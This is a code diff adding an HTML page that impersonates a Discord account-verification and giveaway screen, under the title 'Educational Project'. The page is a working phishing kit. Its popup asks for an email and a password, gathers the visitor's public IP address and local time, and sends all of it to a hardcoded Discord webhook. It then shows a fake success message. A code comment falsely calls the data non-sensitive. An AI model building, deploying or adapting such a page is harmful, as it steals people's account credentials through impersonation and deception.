@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verify - Educational Project</title>
+    <style>
+        /* General Styles */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #000; /* Black background */
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Container */
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 40px 60px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            width: 400px;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #7289da; /* Discord Blue */
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        /* Button Styles */
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #7289da; /* Discord Blue */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #5b6e98;
+            transform: scale(1.1);
+        }
+
+        /* Popup Form */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 30px;
+            border-radius: 12px;
+            color: #fff;
+            z-index: 999;
+            opacity: 0;
+            animation: fadeInPopup 0.5s forwards;
+            width: 350px;
+        }
+
+        .popup input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            background: #333;
+            color: white;
+            transition: border-color 0.3s;
+        }
+
+        .popup input:focus {
+            border-color: #7289da;
+            outline: none;
+        }
+
+        .popup button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1a73e8;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .popup button:hover {
+            background-color: #1669c1;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-30px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInPopup {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to Discord Verify</h1>
+        <button id="verifyButton">Verify Account</button>
+    </div>
+
+    <!-- Popup Form -->
+    <div class="popup" id="popupForm">
+        <h2>Verify For Discord Giveaways</h2>
+        <input type="text" id="username" placeholder="Email" required><br>
+        <input type="email" id="email" placeholder="Password" required><br>
+        <button id="submitForm">Verify</button>
+    </div>
+
+    <script>
+        // Show the popup when the "Verify" button is clicked
+        document.getElementById('verifyButton').addEventListener('click', function() {
+            document.getElementById('popupForm').style.display = 'block';
+        });
+
+        // Get the local time
+        function getLocalTime() {
+            const currentDate = new Date();
+            return currentDate.toLocaleString(); // Get local time in a readable format
+        }
+
+        // Get the public IP address
+        function getIpAddress() {
+            return new Promise((resolve, reject) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip))
+                    .catch(error => reject('Unable to retrieve IP address'));
+            });
+        }
+
+        // Hide the popup when the form is submitted
+        document.getElementById('submitForm').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+
+            if (!username || !email) {
+                alert('Please fill in all fields.');
+                return;
+            }
+
+            const localTime = getLocalTime(); // Get local time
+
+            // Get the public IP address
+            getIpAddress().then(publicIp => {
+                const payload = {
+                    content: `New user verification - Username: ${username}, Email: ${email}, Local Time: ${localTime}, IP Address: ${publicIp}`
+                };
+
+                // Example of sending data to a Discord webhook (only non-sensitive info)
+                const webhookUrl = 'https://discord.com/api/webhooks/1308136666535563405/x6Q3zGroTUrSeNi64MWX24SmCzQzXWHloxDcmFPwK6Er0YLpa8rU880GOp2ty48yMn85';
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Verify Done You Have A New Role');
+                    } else {
+                        alert('Failed to verify.');
+                    }
+                    document.getElementById('popupForm').style.display = 'none';
+                })
+                .catch(error => {
+                    alert('An error occurred. Please try again.');
+                    console.error('Error:', error);
+                });
+            }).catch(error => {
+                alert(error);
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
